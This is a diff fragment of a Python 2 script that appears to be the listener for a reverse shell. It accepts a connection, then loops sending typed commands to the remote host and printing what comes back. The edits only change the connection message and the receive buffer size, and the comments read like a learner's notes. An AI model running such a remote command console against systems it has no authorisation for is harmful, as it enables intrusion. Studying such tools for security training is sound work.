@@ -28,12 +28,12 @@ connection, address = listener.accept()
 #first value - "connection" - socket object representing connection used to send or receive data
 #second value - "addresss" - address bound to the connection
 
-print("[+] Connection established from: " + str(address) + " on port:" + str(listen_port))
-#print("[+] Connection established from", str(address)) - python3
+print("[+] Connection established from: " + address[0] + ":" + str(listen_port))
+#print("[+] Connection established from", address[0], str(listen_port)) - python3
 
 while True:
     command = raw_input(">> ")
     #command = input(">> ") - python3
     connection.send(command) #this will return TypeError in python3; requires bytes-like object, not string
-    result = connection.recv(1024) #receive result in 1024-byte chunks
+    result = connection.recv(buffer_size) #receive result in specified-byte chunks
     print(result)
